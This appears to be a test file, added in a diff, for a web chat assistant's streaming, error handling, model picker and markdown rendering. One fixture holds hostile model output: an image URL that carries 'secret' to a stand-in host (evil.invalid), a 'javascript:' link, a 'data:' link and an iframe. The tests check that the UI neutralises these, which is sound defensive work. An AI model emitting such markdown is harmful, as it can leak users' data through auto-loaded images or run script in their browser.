@@ -1,0 +1,92 @@
+import assert from 'node:assert/strict';
+import fs from 'node:fs/promises';
+import {build} from 'esbuild';
+import {JSDOM} from 'jsdom';
+import React,{act} from 'react';
+import {createRoot} from 'react-dom/client';
+const result=await build({stdin:{contents:"export {readEvents} from './src/assistant/stream';export {createChatAdapter,ERROR_TEXT} from './src/assistant/runtime';export {ModelPicker,rememberedModel} from './src/assistant/ModelPicker';export {parseRoute,normalizeRoute} from './src/api';export {routeLoaders,prefetchRoute} from './src/routeLoader';export {default as Assistant} from './src/Assistant';",resolveDir:import.meta.dirname},bundle:true,write:false,platform:'node',format:'esm',jsx:'automatic',packages:'external',loader:{'.css':'empty'}});
+const path=new URL('./.assistant-test.mjs',import.meta.url);await fs.writeFile(path,result.outputFiles[0].text);
+let ui;try{ui=await import(path.href)}finally{await fs.unlink(path)}
+const encoder=new TextEncoder();
+const stream=(text,width=1)=>new ReadableStream({start(controller){const bytes=encoder.encode(text);for(let i=0;i<bytes.length;i+=width)controller.enqueue(bytes.slice(i,i+width));controller.close()}});
+const event=data=>'data: '+JSON.stringify(data)+'\r\n\r\n';
+const collect=async iterable=>{const values=[];for await(const value of iterable)values.push(value);return values};
+const events=[{type:'text',delta:'今天王小明遲到。'},{type:'done'}];
+for(const width of [1,2,7,1024])assert.deepEqual(await collect(ui.readEvents(stream(': keepalive\r\n\r\n'+events.map(event).join('').trimEnd(),width),new AbortController().signal)),events);
+assert.deepEqual(await collect(ui.readEvents(stream('event: text\ndata: {"type":"text",\ndata: "delta":"跨行"}\n\n'),new AbortController().signal)),[{type:'text',delta:'跨行'}]);
+await assert.rejects(()=>collect(ui.readEvents(stream('data: {broken'),new AbortController().signal)),SyntaxError);
+const abort=new AbortController();let cancelled=false;
+const waiting=new ReadableStream({cancel(){cancelled=true}});
+const reading=collect(ui.readEvents(waiting,abort.signal));abort.abort();await assert.rejects(()=>reading,{name:'AbortError'});assert.equal(cancelled,true);
+const dom=new JSDOM('<div id="root"></div>',{url:'http://localhost/#view=assistant',pretendToBeVisual:true});
+for(const key of ['window','document','location','history','sessionStorage','localStorage','FormData','Event','HTMLElement','navigator','MutationObserver','Element','Node'])Object.defineProperty(globalThis,key,{value:dom.window[key],configurable:true});
+window.matchMedia=()=>({matches:false,addEventListener(){},removeEventListener(){}});
+globalThis.ResizeObserver=class{observe(){}unobserve(){}disconnect(){}};
+window.HTMLElement.prototype.attachEvent=()=>{};window.HTMLElement.prototype.detachEvent=()=>{};
+window.HTMLElement.prototype.scrollIntoView=()=>{};window.HTMLElement.prototype.scrollTo=()=>{};
+globalThis.requestAnimationFrame=fn=>setTimeout(fn,0);globalThis.cancelAnimationFrame=clearTimeout;globalThis.IS_REACT_ACT_ENVIRONMENT=true;
+const json=(data,status=200)=>new Response(JSON.stringify(data),{status,headers:{'content-type':'application/json'}});
+const messages=[{role:'user',content:[{type:'text',text:'今天誰遲到？'}]}];
+const run=async(history=messages,onForbidden=()=>{})=>collect(ui.createChatAdapter(()=>'gpt',()=>'c-test',onForbidden).run({messages:history,abortSignal:new AbortController().signal}));
+let request;
+globalThis.fetch=async(url,init)=>{request={url,...init};return new Response(stream(event({type:'start',conversation_id:'c-test',provider:'gpt'})+event({type:'tool',id:'t1',name:'attendance_today',label:'查詢今天出勤',status:'running'})+event({type:'text',delta:'王'})+event({type:'text',delta:'小明'})+event({type:'tool',id:'t1',name:'attendance_today',label:'查詢今天出勤',status:'done'})+event({type:'done'})))};
+const updates=await run();assert.equal(updates[2].content.at(-1).text,'王');assert.equal(updates.at(-1).content.at(-1).text,'王小明');assert.equal(updates.at(-1).content[0].result,'done');assert.equal(updates.at(-1).status.type,'complete');
+assert.equal(request.credentials,'same-origin');assert.deepEqual(JSON.parse(request.body),{model:'gpt',conversation_id:'c-test',messages:[{role:'user',content:'今天誰遲到？'}]});
+const turn=(role,text,status)=>({role,content:[{type:'text',text}],...(status?{status}:{})});
+const sent=()=>JSON.parse(request.body).messages;
+await run([turn('user','question'),turn('assistant','a'.repeat(21000)),turn('user','next')]);
+assert.equal(sent()[1].content.length,20000,'assistant history clips to 20000 characters');
+await run([turn('user','question'),...['error','cancelled'].map(reason=>turn('assistant','discard',{type:'incomplete',reason})),turn('assistant',''),turn('user','next')]);
+assert.deepEqual(sent().map(m=>m.content),['question','next'],'failed, aborted and empty assistant turns are omitted');
+const longHistory=Array.from({length:25},(_,i)=>turn(i%2?'assistant':'user',String(i)));
+await run(longHistory);assert.equal(sent().length,19,'window drops its leading assistant');assert.equal(sent()[0].content,'6');assert.equal(sent().at(-1).role,'user');
+await run([...longHistory,turn('assistant','stale')]);assert.equal(sent().at(-1).content,'24','history ends with the latest user');
+let validationFetches=0;const successFetch=globalThis.fetch;
+globalThis.fetch=async(...args)=>{validationFetches++;return successFetch(...args)};
+assert.equal((await run([turn('user','x'.repeat(4001))])).at(-1).status.error,ui.ERROR_TEXT.message_limit);assert.equal(validationFetches,0,'long user validation happens before fetch');
+await run([turn('user','x'.repeat(4001)),turn('assistant','discard',{type:'incomplete',reason:'error'}),turn('user','short retry')]);
+assert.deepEqual(sent().map(m=>m.content),['short retry'],'a rejected oversized question does not poison later sends');
+for(const body of [{code:'ai_forbidden'},{}]){
+ let forbidden=0;globalThis.fetch=async()=>json(body,403);
+ assert.equal((await run(messages,()=>forbidden++)).at(-1).status.error,ui.ERROR_TEXT.ai_forbidden);assert.equal(forbidden,1,'403 reports forbidden without retry');
+}
+for(const code of ['ai_unconfigured','ai_quota','ai_busy','ai_upstream','ai_forbidden','ai_refused']){
+ for(const http of [false,true]){globalThis.fetch=async()=>http?json({code,message:'private upstream details'},503):new Response(stream(event({type:'error',code,message:'private upstream details'})));const result=await run();assert.deepEqual(result.at(-1).status,{type:'incomplete',reason:'error',error:ui.ERROR_TEXT[code]})}
+}
+globalThis.fetch=async()=>{throw new TypeError('Failed to fetch')};assert.equal((await run()).at(-1).status.error,ui.ERROR_TEXT.network);
+globalThis.fetch=async()=>new Response(stream(event({type:'text',delta:'partial'})));assert.equal((await run()).at(-1).status.error,ui.ERROR_TEXT.network);
+const runAbort=new AbortController();let fetchSignal;globalThis.fetch=async(_url,init)=>{fetchSignal=init.signal;return new Response(new ReadableStream())};const abortedRun=collect(ui.createChatAdapter(()=>'claude',()=>'abort').run({messages,abortSignal:runAbort.signal}));await new Promise(resolve=>setTimeout(resolve,0));runAbort.abort();await assert.rejects(()=>abortedRun,{name:'AbortError'});assert.equal(fetchSignal,runAbort.signal);
+let expired=0;window.addEventListener('yx:session-expired',()=>expired++);globalThis.fetch=async()=>json({},401);await run();assert.equal(expired,1);
+const catalog={default:'claude',models:[{id:'claude',label:'Claude',available:true},{id:'gpt',label:'GPT',available:false}]};
+localStorage.setItem('yx:ai-model','gpt');assert.equal(ui.rememberedModel(catalog),'claude');
+localStorage.setItem('yx:ai-model','garbage');assert.equal(ui.rememberedModel(catalog),'claude');
+const root=createRoot(document.getElementById('root'));
+const flush=async(fn=()=>{},delay=10)=>act(async()=>{await fn();await new Promise(resolve=>setTimeout(resolve,delay))});
+let selected;await flush(()=>root.render(React.createElement(ui.ModelPicker,{catalog,value:'claude',onChange:id=>selected=id,disabled:false})));
+assert.equal(document.querySelectorAll('button')[1].disabled,true);assert.match(document.body.textContent,/GPT 尚未設定/);
+await flush(()=>document.querySelector('button').click());assert.equal(selected,'claude');assert.equal(localStorage.getItem('yx:ai-model'),'claude');
+assert.equal(ui.parseRoute('#view=assistant').view,'assistant');assert.equal(ui.normalizeRoute({view:'assistant'}).view,'assistant');let prefetched=false;const load=ui.routeLoaders.Assistant;ui.routeLoaders.Assistant=()=>{prefetched=true;return load()};await ui.prefetchRoute({view:'assistant'});assert.equal(prefetched,true);assert.equal(typeof (await ui.routeLoaders.Assistant()).default,'function');
+globalThis.fetch=async url=>url==='/api/ai/models'?json(catalog):new Response(stream(event({type:'text',delta:'今天尚無遲到紀錄。\n\n![private alt](https://evil.invalid/?d=secret) [unsafe](javascript:alert%281%29) [safe](https://example.com) [data](data:text/html,secret)\n\n<iframe src="https://evil.invalid"></iframe>\n\n| 同事 | 紀錄 |\n| --- | --- |\n| 王小明 | 到班 |'})+event({type:'done'})));
+await flush(()=>root.render(React.createElement(ui.Assistant)),40);
+assert.equal(document.querySelectorAll('.assistant-suggestions button').length,4);assert.equal([...document.querySelectorAll('button')].find(b=>b.textContent==='送出').disabled,true);
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[2].click());assert.equal(document.querySelector('textarea').value,'請查詢案件進度：');
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[0].click(),80);assert.match(document.body.textContent,/今天尚無遲到紀錄/);assert.equal(document.querySelectorAll('.assistant-table table tbody tr').length,1);
+assert.equal(document.querySelectorAll('.assistant-message img').length,0,'markdown images render no image element');
+assert.match(document.body.textContent,/private alt/);
+assert.equal(document.querySelector('.assistant-message iframe'),null,'raw HTML stays escaped');
+assert.match(document.body.textContent,/<iframe/);
+const links=[...document.querySelectorAll('.assistant-message a')];assert.equal(links.length,1,'unsafe schemes render plain text');assert.equal(links[0].target,'_blank');assert.equal(links[0].rel,'noopener noreferrer nofollow');
+await flush(()=>[...document.querySelectorAll('button')].find(b=>b.textContent==='新對話').click());assert.equal(document.querySelectorAll('.assistant-suggestions button').length,4);
+globalThis.fetch=async()=>json({},403);
+await flush(()=>document.querySelectorAll('.assistant-suggestions button')[0].click(),60);
+assert.match(document.body.textContent,/你沒有權限查詢這項資料/);assert.equal(document.querySelector('textarea').disabled,true,'chat 403 disables composer');assert.equal([...document.querySelectorAll('button')].find(b=>b.textContent==='送出').disabled,true,'chat 403 disables send');
+assert.equal([...document.querySelectorAll('button')].some(b=>b.textContent==='重試'),false,'forbidden chat cannot retry');
+await flush(()=>root.unmount());
+for(const body of [{code:'ai_forbidden'},{}]){
+ const forbiddenRoot=createRoot(document.getElementById('root'));let calls=0;globalThis.fetch=async()=>{calls++;return json(body,403)};
+ await flush(()=>forbiddenRoot.render(React.createElement(ui.Assistant)),40);
+ assert.match(document.body.textContent,/你沒有權限查詢這項資料/);assert.equal(document.querySelector('textarea')?.disabled??true,true);assert.equal([...document.querySelectorAll('button')].some(b=>b.textContent==='重試'),false);assert.equal(calls,1);
+ await flush(()=>forbiddenRoot.unmount());
+}
+dom.window.close();
+console.log('Assistant passed: UTF-8/chunk boundaries, CRLF/multiline/trailing SSE, abort, tools, errors, session expiry, persistence, disabled models, suggestions and lazy route.');
